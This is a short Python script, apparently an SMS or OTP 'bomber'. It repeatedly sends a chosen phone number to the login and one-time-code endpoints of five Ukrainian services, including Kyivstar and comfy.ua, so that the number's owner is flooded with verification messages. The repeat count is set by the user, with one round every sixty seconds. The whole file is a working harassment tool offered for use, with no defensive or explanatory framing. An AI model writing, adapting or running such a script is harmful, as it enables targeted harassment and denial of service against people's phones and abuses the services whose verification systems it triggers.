import time

import requests

import threading

mutex = threading.Lock()


def bombrer(number):
    try:
        mutex.acquire()
        c = requests.post("https://automoto.ua/uk/my-office/login", json={"phone": f"38 0" + number})
        print(c.text)
        time.sleep(0.1)
        cc = requests.post("https://ucb.z.apteka24.ua/api/send/otp", json={"phone": f"380" + number})
        print(cc.text)
        time.sleep(0.1)
        ccc = requests.post("https://my.lun.ua/api/user/login", json={"login": f"{number}"})
        print(ccc.text)
        time.sleep(0.1)
        cccc = requests.post("https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk",
                             json={"action": "registration", "captcha": None, "login": f"380{number}"})
        print(cccc.text)
        time.sleep(0.1)
        comfy = requests.post("https://comfy.ua/api/auth/v3/otp/send",
                              json={"phone": f"380{number}"})
        print(comfy.text)

    except Exception as e:
        print(e)
    finally:
        mutex.release()


treading_stop = False


def stop():
    global treading_stop
    treading_stop = True


def main(user_input_number, user_input_h):
    global treading_stop
    treading_stop = False
    user_input_howMuch = int(user_input_h)
    if user_input_howMuch == 1:
        bombrer(user_input_number)
    else:
        for i in range(user_input_howMuch):
            if treading_stop is False:
                bombrer(user_input_number)
                time.sleep(60)
            else:
                break
